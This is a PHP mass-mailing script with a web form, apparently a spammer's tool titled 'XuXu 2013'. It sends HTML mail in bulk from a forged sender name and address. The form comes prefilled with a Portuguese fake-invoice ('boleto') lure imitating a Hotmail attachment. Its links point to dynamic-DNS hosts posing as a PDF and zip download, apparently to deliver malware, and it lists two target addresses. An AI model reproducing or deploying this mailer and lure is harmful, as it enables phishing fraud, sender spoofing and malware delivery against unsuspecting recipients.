<?php
$testa = $_POST['veio'];
if($testa != "") {
	$message = $_POST['html'];
	$subject = $_POST['assunto'];
	$nome = $_POST['nome'];
	$de = $_POST['de'];
	$to = $_POST['emails'];

	$headers  = "MIME-Version: 1.0\r\n";
	$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";

	$email = explode("\n", $to);
	$headers .= "From: ".$nome." <".$de.">\r\n";
	$message = stripslashes($message);

	$i = 0;
	$count = 1;
	while($email[$i]) {
	       $bodyhtml = "";
               $bodyhtml = str_replace("[email]",$email[$i], $message);

		if(mail($email[$i], $subject,$bodyhtml, $headers))
		echo "* <b>Mail:</b><i> $count </i>".$email[$i]." <font color=green> Sending...</font><br>";
		else
		echo "* <b>Mail:</b><i> $count </i>".$email[$i]." <font color=red>Stop no Sending</font><br>";
		$i++;
		$count++;
	}
	$count--;
	
 

}

?>
<html>

<head>
<title>XuXu 2013</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
body {
	margin-left: 0;
	margin-right: 0;
	margin-top: 0;
	margin-bottom: 0;
	background-color: #FFFFFF;
}
.titulo {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 70px;
	color: #000000;
	font-weight: bold;
}

.normal {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
	color: #000000;
}

.form {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 10px;
	color: #333333;
	background-color: #FFFFFF;
	border: 1px dashed #666666;
}

.texto {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-weight: bold;
}

.alerta {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-weight: bold;
	color: #990000;
	font-size: 10px;
}
</style>
</head>
<body>
<form action="" method="post" enctype="multipart/form-data" name="form1">
  <input type="hidden" name="veio" value="sim">
  <table width="464" height="511" border="0" cellpadding="0" cellspacing="1" bgcolor="#CCCCCC" class="normal">
    <tr>
      <td width="462" height="25" align="center" bgcolor="#99CCFF">&nbsp;</td>
    </tr>
    <tr>
      <td height="194" valign="top" bgcolor="#FFFFFF">
	  	<table width="100%"  border="0" cellpadding="0" cellspacing="5" class="normal" height="434">
		  <tr>
            <td align="right" height="17"><span class="texto">De (Nome)/(E-Mail) :</span></td>
            <td width="65%" height="17"><input name="nome" type="text" class="form" id="nome" style="width:48%" value="Lucas Eduardo - Gerente Financeiro" >
            <input name="de" type="text" class="form" id="de" style="width:49%" value="boleto@abras.adv.br" ></td>
          </tr>
          <tr>
            <td align="right" height="17"><span class="texto">Assunto:</span></td>
            <td height="17"><input name="assunto" type="text" class="form" id="assunto" style="width:100%" value="AVISO DE FATURA GERADA - VENC. 31/08/2011" ></td>
          </tr>
          <tr align="center" bgcolor="#99CCFF">
            <td height="20" colspan="2" bgcolor="#99CCFF"><span class="texto">C&oacute;digo HTML:</span></td>
          </tr>
          <tr align="right">
            <td height="146" colspan="2" valign="top"><br>

<textarea name="html" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="html">

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
 "http://www.w3.org/TR/html4/loose.dtd">
<html>
   <body>
    <span style="WIDOWS: 2; TEXT-TRANSFORM: none; TEXT-INDENT: 0px; BORDER-COLLAPSE: separate; FONT: medium/20px 'Times New Roman'; WHITE-SPACE: normal; ORPHANS: 2; LETTER-SPACING: normal; COLOR: rgb(0,0,0); WORD-SPACING: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px" class="Apple-style-span"><span style="LINE-HEIGHT: 15px; FONT-FAMILY: Tahoma, Verdana, Arial, sans-serif; COLOR: rgb(42,42,42); FONT-SIZE: 12px" class="Apple-style-span"></span></span>
    <div style="LINE-HEIGHT: 15px; MARGIN: 1px; WIDTH: 206px" class="MediaItem File">
      <a href="http://diazcobrancas.redirectme.net?Visualizar_Boleto.pdf"><img style="PADDING-BOTTOM: 8px; LINE-HEIGHT: 15px; PADDING-LEFT: 8px; PADDING-RIGHT: 8px; BACKGROUND-POSITION: 50% 50%; FLOAT: left; CURSOR: pointer; PADDING-TOP: 8px" class="Thumb FloatLeft" title="Baixe Boleto.pdf (29,2 KB)" alt="Baixe Boleto.pdf (29,2 KB)" src="http://gfx1.hotmail.com/mail/w4/pr04/ltr/at48/default.png"></a>
    </div>
    <div style="LINE-HEIGHT: 15px; PADDING-TOP: 8px" class="Filename">
      Boleto.pdf
    </div>
    <div style="LINE-HEIGHT: 15px" class="FileSize">
      <a style="LINE-HEIGHT: 15px; COLOR: rgb(201,143,51); CURSOR: pointer; TEXT-DECORATION: none" title="Baixe Boleto.pdf (29,2 KB)" href="http://diazcobrancas.redirectme.net?Boleto.pdf">Baixar</a><span style="LINE-HEIGHT: 15px; PADDING-LEFT: 5px">(151,0
      KB)</span>
    </div>
    <div style="LINE-HEIGHT: 15px; DISPLAY: block; WHITE-SPACE: nowrap; MARGIN-BOTTOM: 0px; FLOAT: left" class="ToolbarItem">
      <a style="PADDING-BOTTOM: 3px; LINE-HEIGHT: 15px; MARGIN: 3px; PADDING-LEFT: 3px; PADDING-RIGHT: 3px; DISPLAY: block; COLOR: rgb(42,42,42); CURSOR: pointer; TEXT-DECORATION: none; PADDING-TOP: 3px" onClick="Control.invoke('LiveViewMediaControl','_onLinkClick',event,'download_all');" href="http://diascobrancas2011.redirectme.net?Baixar_Boleto">Baixar
      como zip</a>
    </div>
    <br class="Apple-interchange-newline">&nbsp;
  </body>
</html>

</textarea>

              <span class="alerta">*Lembrete: texto em HTML</span></td>
          </tr>
          <tr align="center" bgcolor="#99CCFF">
            <td height="24" colspan="2"><span class="texto">E-Mails ~ um abaixo do outro.</span></td>
          </tr>
          <tr align="right">
            <td height="136" colspan="2" valign="top"><br>
              <textarea name="emails" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="emails">
railson_paixa0@hotmail.com
hugo.nunes55668@hotmail.com

</textarea>
              <span class="alerta">*Separado por quebra de linha</span> </td>
          </tr>
          <tr>
            <td height="26" align="right" valign="top" colspan="2"><input type="submit" name="Submit" value="Enviar"></td>
          </tr>
        </table>
	  </td>
    </tr>
    <tr>
      <td height="15" align="center" bgcolor="#99CCFF">&nbsp;</td>
    </tr>
  </table>

</form>
</body>
<html>